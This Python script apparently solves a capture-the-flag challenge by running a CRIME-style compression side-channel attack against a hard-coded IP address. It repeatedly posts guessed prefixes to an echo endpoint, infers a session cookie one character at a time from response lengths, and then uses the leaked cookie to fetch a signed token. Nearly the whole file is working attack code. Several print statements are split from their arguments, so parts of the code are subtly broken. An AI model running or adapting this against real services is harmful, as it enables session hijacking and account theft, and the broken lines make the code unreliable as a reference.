# This is supposedly what CRIME by Juliano Rizzo and Thai Duong will do
# Algorithm by Thomas Pornin, coding by xorninja, improved by @kkotowicz
# http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/

import random
import sys
import zlib

import re
import requests

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_='

TOKEN = '846195a381a0d669481d835ad41bf215'
URL_BASE = 'http://47.93.114.77:38700/' + TOKEN
ECHO_URL = URL_BASE + '/' + 'echo'

gcnt = 0


# Returns Content-Length
def echo(prefix):
    global gcnt
    gcnt += 1
    if gcnt % 256 == 0: print
    gcnt
    r = requests.post(ECHO_URL, data={'debug': 1}, params={'$$$': prefix})
    assert "'Content-Length': " in r.content
    return re.findall(r"""Content-Length': '(\d+)'""", r.content)[0]


COOKIE = ''.join(random.choice(charset) for x in range(30))

HEADERS = """
        <h1>echo page</h1>
        <h2>request headers</h2><pre>Accept: */*\r
Connection: close\r
User-Agent: python-requests/2.13.0\r
Accept-Encoding: gzip, deflate\r
Host: localhost:38701\r
Cookie: sessionid=""" + COOKIE + "\r\n" + "X-Forwarded-For: 127.0.0.1\r\n\r\n" + "</pre><h2>args</h2><pre>$$$: "

BODY = """
        <h1>echo page</h1>
        <h2>request headers</h2><pre>Accept: */*\r
Connection: close\r
User-Agent: python-requests/2.13.0\r
Accept-Encoding: gzip, deflate\r
Host: localhost:38701\r
Cookie: sessionid="""

BODY_SUFFIX = """</pre>
    """

cookie = "Pv9ZW45DFvlx8LZRUTmUBQ=="


def compress(data):
    c = zlib.compressobj()
    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)


def findnext(b, bs, charset):
    print
    "body len", len(b)
    # baselen = len(compress(HEADERS +
    #                  b +
    #                  bs + BODY_SUFFIX))
    baselen = echo(b + bs)

    possible_chars = []
    for c in charset:
        length = echo(b + c + bs)

        # print repr(c), length, baselen

        if length <= baselen:
            possible_chars.append(c)

    print
    '=', possible_chars
    return possible_chars


def exit():
    # print "Original cookie: %s" % COOKIE
    print
    "Leaked cookie  : %s" % cookie
    sys.exit(1)


def forward():
    global cookie
    while len(cookie) < 24:
        chop = 1
        possible_chars = findnext(BODY + cookie, "", charset)
        body_tmp = BODY
        orig = possible_chars
        while not len(possible_chars) == 1:
            if len(body_tmp) < chop:
                print
                "stuck at", possible_chars
                return False

            body_tmp = body_tmp[chop:]
            possible_chars = findnext(body_tmp + cookie, "", orig)

            if len(possible_chars) == 2 and '3' in possible_chars:
                possible_chars.remove('3')  # A sane hack to speed it up

        cookie = cookie + possible_chars[0]
        print
        cookie
    return True


while BODY.find("\r\n") >= 0:

    if not forward():
        cookie = cookie[:-1]

    if len(cookie) >= 24:
        break
    print
    "reducing body"
    BODY = BODY[BODY.find("\r\n") + 2:]

r = requests.get('http://47.93.114.77:38701/signtoken', params={'token': TOKEN}, headers={'Cookie': 'sessionid=' + cookie})
print
r.content

exit()
